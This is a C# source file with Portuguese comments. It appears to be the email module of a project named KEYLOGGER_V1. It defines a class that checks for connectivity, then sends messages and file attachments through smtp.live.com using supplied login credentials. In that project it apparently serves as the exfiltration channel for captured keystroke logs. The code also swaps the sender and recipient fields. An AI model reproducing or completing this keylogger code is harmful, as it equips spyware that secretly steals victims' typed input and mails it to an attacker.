/*
 * Tarefa: Efetuar tarefaz de serviços de email. 
 * Autor:  Orion Poseidon
 * Data:   19-05-16
 * 
 */
using System;
using System.Net.Mail;
using System.Diagnostics;
using KEYLOGGER_V1.Interfaces;


namespace KEYLOGGER_V1.Email
{
    public class EmailServico : Email
    {    
        #region Declarações globais 
        /// <summary>
        ///  Chamada da classe que confere as conexões, para a verificação de conectividade com a internet
        /// </summary>
        Interfaces.IConexao _Conexao = new Conexao();

        /// <summary>
        ///  Atributo de texto que carrega o diretorio do arquivo será enviado como anexo.
        /// </summary>
        private string _dirAnexo { get; set; }
        #endregion

        #region Construtores
        /// <summary>
        ///  Construtor da classe de serviço de email simples.
        /// </summary>
        /// <param name="email">Parametro de email simples sem anexo.</param>
        public EmailServico(string login, string senha, string remetente, string destinatario, string assunto, string corpo)
        {
            _login = login;
            _senha = senha;
            _remetente = remetente;
            _destinatario = destinatario;
            _assunto = assunto;
            _corpo = corpo;


        }

        /// <summary>
        ///  Construtor da classe de serviço de email com anexo.
        /// </summary>
        /// <param name="email">Parametro de email simples sem anexo.</param>
        /// <param name="dirAnexo">Diretorio do Anexo</param>
        public EmailServico(string login, string senha, string remetente, string destinatario, string assunto, string corpo, string dirAnexo)
        {
            _login = login;
            _senha = senha;
            _remetente = remetente;
            _destinatario = destinatario;
            _assunto = assunto;
            _corpo = corpo;
            _dirAnexo = dirAnexo;

        }

        #endregion

        #region Metodos de Enviar por Email

        /// <summary>
        ///  Enviar email sem anexo
        /// </summary>
        public bool Enviar()
        {
            if (!_Conexao.conexaoWeb())
            {
                return false;
            }

            MailMessage mensagem;
            Stopwatch Stop = new Stopwatch();

            mensagem = new MailMessage();
            mensagem.To.Add(new MailAddress(_remetente));
            mensagem.From = (new MailAddress(_destinatario));
            mensagem.Subject = _assunto;
            mensagem.IsBodyHtml = true;
            mensagem.Body = _corpo;

            SmtpClient cliente = new SmtpClient("smtp.live.com", 587);

            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential(_login, _senha);

                cliente.EnableSsl = true;
                cliente.Send(mensagem);
            }
            return true;
            
        }

        /// <summary>
        /// Enviar Email com anexo
        /// </summary>
        public bool EnviarAnexo()
        {
            if (!_Conexao.conexaoWeb())
            {
                return false;
            }

                MailMessage mensagem;
                Stopwatch Stop = new Stopwatch();

                mensagem = new MailMessage();
                mensagem.To.Add(new MailAddress(_remetente));
                mensagem.From = (new MailAddress(_destinatario));
                mensagem.Subject = _assunto;
                mensagem.IsBodyHtml = true;
                mensagem.Body = _corpo;
                mensagem.Attachments.Add(new Attachment(_dirAnexo));

                SmtpClient cliente = new SmtpClient("smtp.live.com", 587);

                using (cliente)
                {
                    cliente.Credentials = new System.Net.NetworkCredential(_login, _senha);

                    cliente.EnableSsl = true;
                    cliente.Send(mensagem);
                }
                return true;

        }

        #endregion
    }
        
}
